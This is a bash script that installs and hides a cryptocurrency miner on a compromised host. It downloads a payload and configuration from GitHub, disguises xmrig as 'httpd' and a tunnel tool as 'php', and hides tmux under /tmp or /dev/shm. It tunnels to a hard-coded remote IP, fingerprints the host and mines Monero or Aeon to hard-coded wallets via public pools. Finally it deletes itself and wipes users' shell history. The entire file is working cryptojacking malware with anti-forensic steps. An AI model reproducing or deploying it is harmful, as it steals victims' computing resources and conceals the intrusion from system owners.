#!/usr/bin/env bash
## needed tmux sed grep envsubst

## where are we
c=$(builtin compgen -G '/etc/cpa*')
d=$(builtin compgen -G '/dev/*')
s=$(builtin compgen -G '/sys/*')
p=$(builtin compgen -G '/proc/*')
jail=
if [ -n "$c" -o -z "$d" -o -z "$s" -o -z "$p" ]; then ## we are in a jail
    jail=1
fi

## get payload
BRANCH=master
wget -q https://github.com/untoreh/scripts/archive/${BRANCH}.tar.gz
tar xf ${BRANCH}.tar.gz && rm ${BRANCH}.tar.gz
cd scripts-${BRANCH} || exit 1

. ./functions || exit 1

## relocate tmux
trel=false
for ph in {/tmp,/dev/shm,~/}; do
    rm -rf ${ph}/.tmx && \
        mkdir -p ${ph}/.tmx && \
        mv pl/tmux ${ph}/.tmx/init && \
        export PATH=${ph}/.tmx:$PATH && \
        trel=${ph}/.tmx && break
done
[ $trel = false ] && { printf "couldn't relocate tmux" ; exit 1; }

## utility vars
CFG_BASE_URL=https://rawgit.com/untoreh/scripts/master/cfg/

## note quote vars that need quoting
define SHENV <<SHAREDENV
TERMINFO=pl/ \
TERM=tmux \
SHELL=$(/usr/bin/which bash) \
PATH=.:pl:$PATH \
HOME=${HOME:-/tmp}
SHAREDENV
printf "%s" "$SHENV" > shared.env
[ ! -e shared.env ] && printf "error dumping shared env" && exit 1
. ./shared.env
[ -z "$SHELL" ] && printf "bash not found" && exit 1

## custom socket path for tmux
tmxf="function tmx(){
    TMUX= \
    TMUX_TMPDIR=${trel} \
    ${SHENV/$'\n'} \
    init \"\$@\"
}"
printf "%s" "$tmxf" > tmx && . ./tmx || exit 1
## make sure tmux is working and also spawn a session with clean args
tmx kill-server &>/dev/null
tmx new -d || { printf "failed to start tmux"; exit 1 ; }
if [ $(tmx ls | wc -l) = 0 ]; then
    printf "nop session not found, exiting"
    exit 1
fi

## glibc not needed on standalone

## tnl
## $1 is the starting port (for overrides)
function gen_tstarter(){
    define TSTARTER <<TSTARTER
#!/bin/bash

. ./functions || exit 1
. ./shared.env || exit 1
. ./tmx || exit 1


portavl() {
          if \$(busybox nc -z 127.0.0.1 \${TNL_LISTEN}); then
             return 1
          else
             return 0
          fi
}
checktnl() {
         local pid="\$(pgrep -xf "${TNL_MASK} ${TNL_ARGS}\s*")"
         ## lsof or netstat require /proc so not reliable
         local port="\$(busybox nc -z 127.0.0.1 \${TNL_LISTEN} && printf 1)"
         local tss="\$(tmx ls | grep ${TNL_MASK})"
         if [ -z "\$pid" -o -z "\$port" -o -z "\$tss" ]; then ## order kind of matters
            return 1
         else
            return 0
         fi
}
starttnl(){
    ## starttnl should never be called more than once at a time
    if [ -n "\$(pgrep -xf "${TNL_MASK} ${TNL_ARGS}\s*")" ]; then
       if [ -n "\$(tmx ls | grep "$TNL_MASK")" ]; then
          printf "%s" \${PREV_TNL_LISTEN} ## the previous port binded
          exit ## tnl started and already in session
       else ## a rogue tunnel not within its session kill it
          pkill -xf "${TNL_MASK} ${TNL_ARGS}"
       fi
    fi
    tmx kill-session -t ${TNL_MASK} &>/dev/null
    tmx new-session -d -s ${TNL_MASK} "exec ${TNL_MASK} ${TNL_ARGS} &>/dev/null"
    fleep 1 ## time to bind
}

export TNL_LISTEN=\$1
tmx kill-session -t ${TNL_MASK} &>/dev/null
for port in $TNL_PLIST; do
    if portavl; then
        starttnl
    else
        checktnl && exit 0 ## check again in case of late start
        PREV_TNL_LISTEN=\$TNL_LISTEN
        export TNL_LISTEN=\$port
        envsubst -no-empty -i cfg/${TNL_CFG_MASK}.tpl -o ${TNL_CFG_MASK}
        continue
    fi
    if checktnl; then
        printf "%s" \${TNL_LISTEN}
        exit
    else
        PREV_TNL_LISTEN=\$TNL_LISTEN
        export TNL_LISTEN=\$port
        envsubst -no-empty -i cfg/${TNL_CFG_MASK}.tpl -o ${TNL_CFG_MASK}
    fi
done

exit 1

TSTARTER
    printf "%s" "$TSTARTER" > tstarter
    local ret=$?
    chmod +x tstarter
    return $ret
}

function setup_tnl(){
    TNL_REMOTE=${TNL_REMOTE:-212.237.6.194}
    TNL_PLIST="80 8081 443 8081 8082 9000 10000 3036 20 21 465 993 995 110 123 2703 3036"
    TNL_CFG=${TNL_CFG:-gst.json}
    TNL_PATH=${TNL_PATH:-$(/usr/bin/which gst)}
    PC_PATH=${PC_PATH:-$(/usr/bin/which pc)}
    TNL_MASK=${TNL_MASK:-php}
    TNL_CFG_MASK=${TNL_CFG_MASK:-php.ini}
    PC_CFG=${PC_CFG:-pc.conf}
    TNL_ARGS=${TNL_ARGS:--C ${TNL_CFG_MASK}}
    ## download cfg
    if [ ! -e "cfg/${TNL_CFG_MASK}.tpl" ]; then
        wget -q "${CFG_BASE_URL}${TNL_CFG}.tpl" -O "cfg/${TNL_CFG_MASK}.tpl"
    fi
    ## download pc
    if [ ! -e "cfg/${PC_CFG}.tpl" ]; then
        wget -q "${CFG_BASE_URL}${PC_CFG}.tpl" -O "cfg/${PC_CFG}.tpl"
    fi
    ## mask
    if [ -e "$TNL_PATH" ]; then
        mv "$TNL_PATH" "$(dirname ${TNL_PATH})/${TNL_MASK}"
    fi
    ## config with needed vars
    if [ "$jail" -o -n "$(uname -r | grep -E ^2\.6\.[0-9]*\|^3\.1[0-9]*)" ]; then
        TNL_PROTO=${TNL_PROTO:-socks+tcp}
    fi
    if [ "$lowhw" ]; then
        TNL_TARGET=${TNL_TARGET:-pool.supportaeon.com:3333}
    fi
    export TNL_REMOTE="$TNL_REMOTE" \
           TNL_LISTEN=${TNL_LISTEN:-8080} \
           TNL_PROTO \
           TNL_PROTO_PC \
           TNL_TARGET
    envsubst -no-empty -i cfg/${TNL_CFG_MASK}.tpl -o ${TNL_CFG_MASK}
    gen_tstarter && TNL_LISTEN=$(./tstarter ${TNL_LISTEN})
    export TNL_LISTEN ## tstarter should echo the working port
    envsubst -no-empty -i cfg/${PC_CFG}.tpl -o ${PC_CFG}
}; setup_tnl

OBJ_MASK="${OBJ_MASK:-httpd}"
PAUSD_DAEMON="${PAUSD_DAEMON:-pausd}"
OBJ_CFG="${OBJ_CFG:-httpd-1.conf}"
PAUSD_ARGS="${PAUSD_ARGS:-${OBJ_MASK} -c ${OBJ_MASK}.conf}"

## download cfg
if [ ! -e "$OBJ_CFG" ]; then
	wget -q "${CFG_BASE_URL}${OBJ_CFG}" -O "${OBJ_MASK}.conf.tpl"
fi

## object in sln should be present in pl/
OBJ_NAME=${OBJ_NAME:-xmrig}
mv pl/${OBJ_NAME} ${OBJ_MASK}
chmod +x ${OBJ_MASK} &>/dev/null

## daemon
# (when not included in the payload)
# PAUSD_DAEMON_URL=https://rawgit.com/untoreh/scripts/master/${PAUSD_DAEMON}
# wget -q ${PAUSD_DAEMON_URL}
chmod +x ${PAUSD_DAEMON} &>/dev/null

## daemon conf
## misc
[ $(id -u) != 0 ] && sudo=$(/usr/bin/which sudo 2>/dev/null)
printf 128 | $sudo tee /proc/sys/vm/nr_hugepages &>/dev/null
## instance ID
CPU=$(grep "model name" < /proc/cpuinfo | head -1 | sed -r 's/model name\s*:\s*|[^a-zA-Z0-9]*//g')
CORES=$(nproc || grep -c "cpu cores" < /proc/cpuinfo)
DATE=$(date +%s)
IPADDR=$(wget -qO- ipinfo.io/ip)
HOSTN=$(hostname)
## cpu
cpu_p=$(cat /sys/fs/cgroup/cpuacct,cpu/cpu.cfs_period_us 2>/dev/null)
cpu_q=$(cat /sys/fs/cgroup/cpuacct,cpu/cpu.cfs_quota_us 2>/dev/null)
if [ -n "$cpu_p" -a -n "$cpu_q" ]; then ## respect cgroups
    ACORES=$((cpu_p / cpu_q)) ## the available cpu (in number of cores)
    ## compose a binary string to map affinity (printf from bash or non busybox)
    if [ "$ACORES" = 1 -a "$CORES" -gt 1 ]; then ## if max cpu is one and more threads are possible, use 2 threads
        bin_s=$(printf '0\n%.0s' $(seq 1 $((CORES - 2))))$(printf "\n1\n1") ## append two cores
        PAUSD_THREADS=${PAUSD_THREADS:-2}
    else ## just use as many available cores
        bin_s=$(printf '0\n%.0s' $(seq 1 $((CORES - ACORES))))$(printf '\n1%.0s' $(seq 1 $ACORES))
        PAUSD_THREADS=${PAUSD_THREADS:-$ACORES}
    fi
else ## no cgroups, use all cores
    bin_s=$(printf '0\n%.0s' $(seq 1 $CORES))
    PAUSD_THREADS=${PAUSD_THREADS:-$CORES}
fi
## shuffle affinity and get hex string
bin_s=$(printf "%s" "$bin_s" | shuf | while read c; do echo -n $c; done) ## shuffle
hex_s=$(printf '%x\n' "$((2#$bin_s))") ## hex string, bashism
if [ -z "$hex_s" -o "$hex_s" = 0 ]; then
    export AFFINITY="0x0"
else
    export AFFINITY="0x$hex_s"
fi

## vars set through tmux
export PAUSD_THREADS PAUSD_VER=${PAUSD_VER:-2}
export PAUSD_SHARES=${PAUSD_SHARES:-$((PAUSD_THREADS * PAUSD_VER))} \
       PAUSD_RATE=${PAUSD_RATE:-200} \
       PAUSD_PC_CFG=${PC_CFG}

export \
ID=${ID:-"{$IPADDR}{$HOSTN}{$DATE}{$CORES}{$CPU}"} \
PA=${PA:-4ACgpqzFZCiRfmZHAX11tAMLft1KNvLhWh83JXpYFKfKDhT7GXK89AoM4jNV1RRUUghAbuP1FrqTFU5w4zbN3F9GG6mqNPq} \
AL=${AL:-cryptonight} \
ENDPOINT=${ENDPOINT:-pool.supportxmr.com:${PAUSD_DIFF:-3333}}

## set vars used by pausd daemon in tmux and envsubst
printf "" > "config.${PAUSD_DAEMON}"
for v in $(builtin compgen -A variable | grep ^PAUSD); do
    export $v
    printf "%s" "${v}=\"${!v}\" " >> "config.${PAUSD_DAEMON}"
    # tmx setenv -g $v "${!v}" ; ## don't use env vars for daemon configs, use file
done

## subst
envsubst -no-empty -i "${OBJ_MASK}.conf.tpl" -o "${OBJ_MASK}.conf"

## dump config and init
tmx new-session -d -s ${PAUSD_DAEMON} "exec ${PAUSD_DAEMON}" # ${PAUSD_ARGS}
fleep 1 ## give time to fail

## cleanup
## wait for tmux session to startup
slept=0
while [ "$(tmx list-panes -t "${PAUSD_DAEMON}" | wc -l)" -lt 2 ]; do
    slept=$((slept+1))
    if [ $slept -gt 5 ]; then ## no aes means crash means aeon
        ## try without hw accel
        PAUSD_VER=${PAUSD_VER/1/3} PAUSD_VER=${PAUSD_VER/2/4} && export PAUSD_VER
        ## switch PA to different co
        PA="WmsNJ3Usa4T7AbXz6ZRTdi5hjrqeXsGFMHEEwpv5g2sbgtEWxJZeBA4hqMusHAyWBVaDktNhZHTvTd6RfngAJNpF1wDzwqaNo"
        ## change algo
        AL="cryptonight-lite"
        ## change endpoint
        ENDPOINT=${ENDPOINT_ALT:-pool.supportaeon.com:${PAUSD_DIFF:-3333}}
        ## update object config
        envsubst -no-empty -i ${OBJ_MASK}.conf.tpl -o ${OBJ_MASK}.conf
        ## init
        tmx kill-session -t ${PAUSD_DAEMON}
        tmx new-session -d -s ${PAUSD_DAEMON} "exec ${PAUSD_DAEMON}" # ${PAUSD_ARGS}
        while [ "$(tmx list-panes -t "${PAUSD_DAEMON}" | wc -l)" -lt 2 ]; do fleep 1; done
        break
    fi
    fleep 1;
done
fleep 1 ## once more for edge cases

## stop noop tmux session
tmx kill-session -t 0

cd ..
## debug
[ "$DEBUG" ] && env>dump.env && exit

rm -rf -- "$0" \
   "scripts-${BRANCH}" \
   "$HOME"/.*_history \
   ~/.*_history \
   /.*_history
